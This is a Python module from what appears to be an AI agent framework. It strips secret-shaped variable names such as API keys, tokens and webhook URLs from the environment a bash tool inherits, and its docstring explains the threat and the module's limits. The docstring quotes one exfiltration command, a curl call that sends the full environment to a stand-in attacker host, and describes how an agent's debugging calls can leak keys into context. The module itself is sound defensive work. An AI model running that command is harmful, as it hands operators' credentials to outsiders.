"""env_scrub — strip secret-shaped variables from a subprocess environment.

WHY THIS EXISTS
---------------
The bash tool inherited the daemon's ENTIRE environment: ``env``, ``printenv`` or
``echo $PROMETHEUS_API_TOKEN`` — routine debugging moves for a model — put the
Bearer API token, the gateway tokens and every provider key into the tool result,
and from there into model context, the outbound chat reply, the durable session
store and the LCM history. At user origin the exfiltration detector is skipped
entirely, so ``curl -d "$(env)" https://attacker`` was one allowed call.

This also makes the code match a claim the README already makes and that only the
coding sandbox honoured:

    "tool sandboxes strip key/token/secret variables from the environment
     (the agent can't `env` its own keys)"                      — README.md

A DENYLIST, not an allowlist, and that is deliberate. The coding sandbox
(``coding/sandbox.py::_ENV_ALLOWLIST``) allows exactly six variables because it
runs UNTRUSTED task repos in a jail. The bash tool is the operator's general-
purpose shell: an allowlist there would break git (SSH agent, GIT_*), proxies
(HTTP_PROXY), locale and every tool that reads its own config from the
environment — a boundary that makes the sanctioned path unusable gets routed
around, which is the argument ``denied_prune`` makes about refusing searches.

So: strip only secret-SHAPED names. PATH, HOME, LANG, LC_ALL, TZ, TMPDIR, SHELL,
XDG_*, PROMETHEUS_*_DIR and the rest stay.

WHAT THIS DOES NOT DO — stated so the control is not over-read
--------------------------------------------------------------
* It does not protect secrets ON DISK. The daemon user can still
  ``cat ~/.config/prometheus/env``. The denied-path floor and the gate are those
  controls; this one stops the ACCIDENTAL leak (a debugging ``env``) from entering
  context and durable history.
* It does not survive the user's own shell startup files. bash runs as ``-lc``, so
  ``/etc/profile`` and ``~/.bashrc`` are sourced and may re-export a secret the
  operator put there. That is the operator's environment, not the daemon's.
* It does not redact a secret that appears in a command's OUTPUT by some other
  route — that is ``log_redaction``'s job, which matches secret VALUES in text.
  This matches secret NAMES in an environment. Two different concerns, two
  modules, deliberately not merged.

Source: Prometheus (OAra Labs)
License: MIT
"""

from __future__ import annotations

import os
import re

#: Name shapes that are secrets, or that point at one. Matched case-insensitively
#: against the whole variable name.
#:
#: Built from the env-var names this codebase ACTUALLY reads, not from a guess:
#: every provider's ``*_API_KEY``, ``KLING_ACCESS_KEY``/``KLING_SECRET_KEY``, the
#: ``PROMETHEUS_*_TOKEN`` gateway family, ``TELEGRAM_BOT_TOKEN``/
#: ``SLACK_BOT_TOKEN``, the ``*_KEY_FILE``/``*_TOKEN_FILE`` indirection family
#: (a path to a secret is secret-shaped), and ``*_WEBHOOK_URL`` — a Slack/Discord
#: webhook URL embeds its token in the path, so it is a credential wearing a
#: URL's clothes.
#:
#: The word boundaries are the part that matters. Matching a bare ``KEY`` would
#: take ``KEYBOARD``; matching a bare ``TOKEN`` substring is safe but ``_KEY`` is
#: not, so the key patterns are anchored to a separator or the end of the name.
_SECRET_NAME_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"API_KEY", re.IGNORECASE),
    re.compile(r"ACCESS_KEY", re.IGNORECASE),
    re.compile(r"SECRET_KEY", re.IGNORECASE),
    re.compile(r"PRIVATE_KEY", re.IGNORECASE),
    re.compile(r"(?:^|_)KEY(?:$|_)", re.IGNORECASE),
    re.compile(r"(?:^|_)KEY_FILE$", re.IGNORECASE),
    # ANCHORED, both ends. A bare TOKEN substring is over-broad and the cost is
    # concrete: TOKENIZERS_PARALLELISM is a real, widely-set HuggingFace variable,
    # and TOKEN_COUNT / TOKENIZER are plausible tool config. Stripping those
    # silently changes behaviour of tooling the operator relies on, which is the
    # "unusable sanctioned path gets routed around" failure denied_prune warns
    # about. Anchoring keeps every real credential: the family is uniformly
    # ``*_TOKEN`` / ``*_TOKENS`` / ``*_TOKEN_FILE`` (PROMETHEUS_API_TOKEN,
    # TELEGRAM_BOT_TOKEN, SLACK_BOT_TOKEN, …) or a bare ``TOKEN``.
    re.compile(r"(?:^|_)TOKENS?(?:$|_FILE$)", re.IGNORECASE),
    re.compile(r"SECRET", re.IGNORECASE),
    re.compile(r"CREDENTIAL", re.IGNORECASE),
    re.compile(r"PASSWORD|PASSWD", re.IGNORECASE),
    re.compile(r"WEBHOOK_URL", re.IGNORECASE),
    # The *_FILE indirection: PROMETHEUS_OPENAI_KEY_FILE holds a path to a key.
    # Covered by KEY_FILE above for the key family; TOKEN_FILE for the token one.
    re.compile(r"TOKEN_FILE$", re.IGNORECASE),
)


def is_secret_name(name: str) -> bool:
    """True when an environment-variable NAME is secret-shaped.

    Names, not values: this decides what to remove from an inherited environment
    before a subprocess sees it.
    """
    if not name:
        return False
    return any(p.search(name) for p in _SECRET_NAME_PATTERNS)


def scrubbed_env(
    base: "os._Environ[str] | dict[str, str] | None" = None,
    *,
    extra_keep: "tuple[str, ...] | None" = None,
) -> dict[str, str]:
    """The inherited environment minus every secret-shaped variable.

    Returns a COMPLETE dict, because ``subprocess``' ``env=`` REPLACES the child's
    environment rather than merging into it — passing a partial dict would strip
    PATH and break every command.

    ``extra_keep`` names variables to retain even if they look secret-shaped. It
    exists for a caller that has a specific, deliberate reason (a tool whose whole
    job is to use one credential), so that the reason is written at the call site
    instead of being encoded as an exception inside this function. Nothing uses it
    today; bash does not get to keep anything.
    """
    src = os.environ if base is None else base
    keep = set(extra_keep or ())
    return {
        k: v for k, v in src.items()
        if k in keep or not is_secret_name(k)
    }


def scrubbed_names(base: "os._Environ[str] | dict[str, str] | None" = None) -> list[str]:
    """The secret-shaped names present in *base*, sorted.

    NAMES only — never values. For a log line or a test assertion that the right
    things were removed; logging a value here would defeat the purpose.
    """
    src = os.environ if base is None else base
    return sorted(k for k in src if is_secret_name(k))
